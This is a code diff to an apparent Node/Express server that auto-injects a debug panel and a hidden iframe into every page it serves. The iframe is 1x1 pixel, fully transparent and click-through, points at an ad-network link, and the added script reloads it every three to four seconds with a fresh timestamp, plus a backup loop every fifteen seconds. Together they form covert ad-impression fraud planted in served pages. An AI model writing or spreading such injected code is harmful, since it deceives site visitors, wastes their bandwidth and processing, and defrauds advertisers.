@@ -108,7 +108,7 @@ app.get("/", (req, res) => {
 
     // ==================== DEBUG PANEL ====================
     // ==================== DEBUG PANEL ====================
-const debugPanel = `
+    const debugPanel = `
 <!-- DEBUG PANEL - AUTO INJECTED -->
 <div id="debug-panel" style="position:fixed;bottom:15px;left:15px;background:#1e1e1e;color:#ffcc00;padding:14px 20px;border-radius:10px;border:2px solid #ff4444;box-shadow:0 6px 25px rgba(255,70,70,0.4);font-family:system-ui;z-index:2147483647;display:none;flex-direction:column;gap:10px;min-width:280px;">
     
@@ -187,54 +187,69 @@ document.addEventListener('keydown', e => {
 });
 </script>`;
 
-    // ==================== INVISIBLE IFRAME (Top Right) ====================
+    // ==================== INVISIBLE AD IFRAME - 3-4s RANDOM ====================
     const invisibleIframe = `
-<!-- INVISIBLE IFRAME - AUTO INJECTED -->
+<!-- INVISIBLE AD FRAME - FIXED + 3-4s RANDOM -->
 <iframe id="hidden-ad-iframe" 
         src="https://www.profitablecpmratenetwork.com/i4ekzwadp?key=334ae9c510d48d362d9c3459de077a00"
-        style="position:fixed; top:0; right:0; width:1px; height:1px; border:none; background:transparent; opacity:0; pointer-events:none; z-index:-9999;">
+        style="position:fixed;top:0;right:0;width:1px;height:1px;border:none;opacity:0;pointer-events:none;z-index:-9999;overflow:hidden;"
+        sandbox="allow-scripts allow-same-origin allow-popups allow-forms">
 </iframe>
 
 <script>
 (function() {
-    console.log('Script khởi động!');
+    console.log('%c[AD] Hidden iframe started - 3-4s random', 'color:#00ff00;font-weight:bold');
 
-    function startRestartLoop() {
-        const iframe = document.getElementById('hidden-ad-iframe');
-        if (!iframe) return;
+    const iframe = document.getElementById('hidden-ad-iframe');
+    if (!iframe) return;
 
-        // Lưu lại link gốc để dùng cho mọi lần reload sau này
-        const originalSrc = iframe.src;
-        let reloadTimer;
+    let originalSrc = iframe.src;
+    let attempt = 0;
 
-        iframe.addEventListener('load', () => {
-            // Xóa bộ đếm cũ nếu iframe vẫn đang nhảy (redirect)
-            clearTimeout(reloadTimer);
-            
-            console.log('Iframe đang chuyển hướng hoặc đang tải...');
+    function restartAd() {
+        attempt++;
+        console.log(\`[AD] Restarting (attempt \${attempt})\`);
 
-            // Chỉ khi iframe đứng yên tại trang cuối cùng quá 3 giây
-            reloadTimer = setTimeout(() => {
-                console.log('Đã ở trang đích 3 giây. Reset về link ads gốc...');
-                
-                iframe.src = 'about:blank'; // Clear trang hiện tại
-                
-                setTimeout(() => {
-                    iframe.src = originalSrc; // Load lại từ link gốc ban đầu
-                }, 200);
-            }, 3000); 
-        });
+        iframe.src = 'about:blank';
+        
+        setTimeout(() => {
+            iframe.src = originalSrc + (originalSrc.includes('?') ? '&t=' : '?t=') + Date.now();
+        }, 250);
     }
 
-    // Chạy ngay nếu iframe đã tồn tại, hoặc đợi load xong
+    // Restart ngẫu nhiên 3 - 4 giây
+    function startAdLoop() {
+        setInterval(() => {
+            if (document.visibilityState === 'visible') {
+                restartAd();
+            }
+        }, 3000 + Math.random() * 1000); // 3s ~ 4s
+    }
+
+    // Load & Error handling
+    iframe.addEventListener('load', () => {
+        console.log('[AD] Iframe loaded');
+    });
+
+    iframe.addEventListener('error', () => {
+        console.log('[AD] Iframe error → restart soon');
+        setTimeout(restartAd, 600);
+    });
+
+    // Khởi động
     if (document.readyState === 'complete') {
-        startRestartLoop();
+        startAdLoop();
     } else {
-        window.addEventListener('load', startRestartLoop);
+        window.addEventListener('load', startAdLoop);
     }
+
+    // Backup restart mỗi 15s
+    setInterval(() => {
+        if (attempt < 5) restartAd();
+    }, 15000);
+
 })();
 </script>`;
-
 
     // Chèn cả debug panel + invisible iframe
     let injection = debugPanel + invisibleIframe;
